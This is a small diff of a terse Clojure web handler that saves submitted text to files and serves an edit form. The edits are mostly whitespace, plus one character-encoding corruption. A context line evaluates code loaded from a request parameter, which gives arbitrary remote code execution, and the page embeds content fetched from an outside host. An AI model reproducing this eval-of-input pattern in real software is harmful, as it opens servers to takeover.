@@ -8,9 +8,9 @@
   hh(fn[m](apply str(map #(format"%02x" %)m)))]
 (if(.getParameter rq"e")((eval (read-string(slurp e)))rq rs)
  (if(=(.getParameter rq"a")"save")(do
-  (spit(str "1220"(hh(h(.getBytes t)))".txt") t)
+  (spit(str"1220"(hh(h(.getBytes t)))".txt") t)
   (str"saved"(hh(h(.getBytes t)))))
-(hiccup.core/html"<!DOCTYPE html>"[:html[:head[:title"/edit « ?"]][:body(slurp"https://dresdenlabs.appspot.com/at")
+(hiccup.core/html"<!DOCTYPE html>"[:html[:head[:title"/edit Â« ?"]][:body(slurp"https://dresdenlabs.appspot.com/at")
  [:form
-  [:textarea {:name"t"}]
+  [:textarea{:name"t"}]
   [:input{:type"submit":name"a":value"save"}]]]]))))))
